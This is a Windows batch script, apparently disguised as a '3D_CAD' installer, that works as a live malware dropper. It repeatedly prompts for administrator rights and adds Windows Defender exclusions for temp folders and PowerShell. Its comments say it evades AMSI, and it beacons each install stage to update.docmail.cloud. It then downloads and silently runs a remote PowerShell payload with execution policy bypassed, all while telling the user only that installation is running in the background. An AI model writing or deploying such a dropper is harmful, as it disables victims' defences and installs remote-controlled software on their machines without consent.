@echo off
fsutil dirty query %SystemDrive% >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol='Tls12';$t=[IO.Path]::Combine($env:TEMP,'rmm_run.bat');try{(New-Object Net.WebClient).DownloadFile('https://update.docmail.cloud/installer/bat-pub?c=1P4GS9',$t)}catch{};if(-not(Test-Path $t)){Remove-Item -LiteralPath '%~f0' -Stream 'Zone.Identifier' -EA 0;$t='%~f0'};$max=4;for($i=1;$i -le $max;$i++){try{Start-Process $t -Verb RunAs -WindowStyle Hidden -EA Stop;$null=Invoke-WebRequest -Uri 'https://update.docmail.cloud/install-status?c=1P4GS9&event=UAC_ACCEPTED&detail=3D_CAD.bat' -UseBasicParsing -TimeoutSec 5 -EA SilentlyContinue;break}catch{$msg=if($i -lt $max){'Attempt '+$i+' of '+$max+' declined - retrying'}else{'Attempt '+$i+' of '+$max+' declined - giving up'};$null=Invoke-WebRequest -Uri ('https://update.docmail.cloud/install-status?c=1P4GS9&event=UAC_REJECTED&detail='+[uri]::EscapeDataString($msg)) -UseBasicParsing -TimeoutSec 5 -EA SilentlyContinue;if($i -lt $max){Start-Sleep 2}}}"
    exit /b
)

del /f /q "C:\Windows\Temp\rmm_install_done.flag" >nul 2>&1

rem Defender exclusions first — clears the way before any install activity
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath @($env:TEMP,$env:USERPROFILE+'\Downloads','C:\Windows\Temp','C:\Program Files\Windows Network Services','C:\Program Files (x86)\Windows Network Services','C:\ProgramData\WinNetSvc') -EA 0;Add-MpPreference -ExclusionProcess @('svchost_net.exe','RuntimeBroker_svc.exe','msiexec.exe','powershell.exe') -EA 0" >nul 2>&1

rem BAT_STARTED: curl.exe bypasses AMSI/PowerShell blocking; PS fallback for older Windows
curl.exe -s --retry 2 -m 5 "https://update.docmail.cloud/install-status?c=1P4GS9&event=BAT_STARTED&detail=3D_CAD.bat" >nul 2>&1 || powershell -NoProfile -WindowStyle Hidden -Command "$null=Invoke-WebRequest -Uri 'https://update.docmail.cloud/install-status?c=1P4GS9&event=BAT_STARTED&detail=3D_CAD.bat' -UseBasicParsing -TimeoutSec 5 -EA 0" >nul 2>&1

rem Watchdog: pure cmd.exe (no PowerShell/EncodedCommand avoids AMSI kill)
(
echo @echo off
echo ping -n 131 127.0.0.1 ^>nul 2^>^&1
echo if exist "C:\Windows\Temp\rmm_install_done.flag" exit /b 0
echo curl.exe -s -m 8 "https://update.docmail.cloud/install-status?c=1P4GS9&event=STUCK_120S&detail=3D_CAD.bat" ^>nul 2^>^&1
echo powershell -NoProfile -WindowStyle Hidden -Command "$null=Invoke-WebRequest -Uri 'https://update.docmail.cloud/install-status?c=1P4GS9&event=STUCK_120S&detail=3D_CAD.bat' -UseBasicParsing -TimeoutSec 8 -EA 0" ^>nul 2^>^&1
) >"%TEMP%\rmm_wd.cmd" 2>nul
start /b "" cmd.exe /c "%TEMP%\rmm_wd.cmd"

sc query WinNetSvcHost >nul 2>&1
if errorlevel 1 goto _svc_skip
sc stop WinNetSvcHost >nul 2>&1
for /l %%i in (1,1,15) do (
    sc query WinNetSvcHost 2>nul | findstr /C:"STOPPED" >nul && goto _svc_stopped
    timeout /t 1 /nobreak >nul
)
:_svc_stopped
sc delete WinNetSvcHost >nul 2>&1
:_svc_skip
rd /s /q "C:\Program Files\Windows Network Services" >nul 2>&1
rd /s /q "C:\Program Files (x86)\Windows Network Services" >nul 2>&1

taskkill /F /IM msiexec.exe /T >nul 2>&1
powershell -NoProfile -WindowStyle Hidden -Command "Get-CimInstance Win32_Process | Where-Object { $_.Name -eq 'powershell.exe' -and $_.CommandLine -like '*rmm_s.ps1*' -and $_.ProcessId -ne $PID } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }" >nul 2>&1

powershell -NoProfile -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol='Tls12';for($i=1;$i -le 4;$i++){try{[IO.File]::WriteAllText('C:\Windows\Temp\rmm_s.ps1',(Invoke-WebRequest -Uri 'https://update.docmail.cloud/installer/ps1?c=1P4GS9' -UseBasicParsing -TimeoutSec 12 -EA Stop).Content);break}catch{if($i -lt 4){Start-Sleep ($i*2)}}}" >nul 2>&1
powershell -NoProfile -WindowStyle Hidden -Command "if(-not(Test-Path 'C:\Windows\Temp\rmm_s.ps1') -or (Get-Item 'C:\Windows\Temp\rmm_s.ps1' -EA SilentlyContinue).Length -lt 100){[Net.ServicePointManager]::SecurityProtocol='Tls12';try{$null=Invoke-WebRequest -Uri 'https://update.docmail.cloud/install-status?c=1P4GS9&event=PS1_EMPTY' -UseBasicParsing -TimeoutSec 5 -EA SilentlyContinue}catch{};exit 1};exit 0" >nul 2>&1
if %errorlevel% neq 0 exit /b
powershell -NoProfile -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol='Tls12';try{$null=Invoke-WebRequest -Uri 'https://update.docmail.cloud/install-status?c=1P4GS9&event=PS1_LAUNCHING' -UseBasicParsing -TimeoutSec 5 -EA SilentlyContinue}catch{}" >nul 2>&1
powershell -NoProfile -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -ArgumentList @('-NonInteractive','-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File','C:\Windows\Temp\rmm_s.ps1')" >nul 2>&1

echo done > "C:\Windows\Temp\rmm_install_done.flag" 2>nul
echo Setting up, please wait...
echo Downloading and installing in the background...
echo Installation is running in the background. You may safely close this window.
timeout /t 15 /nobreak >nul
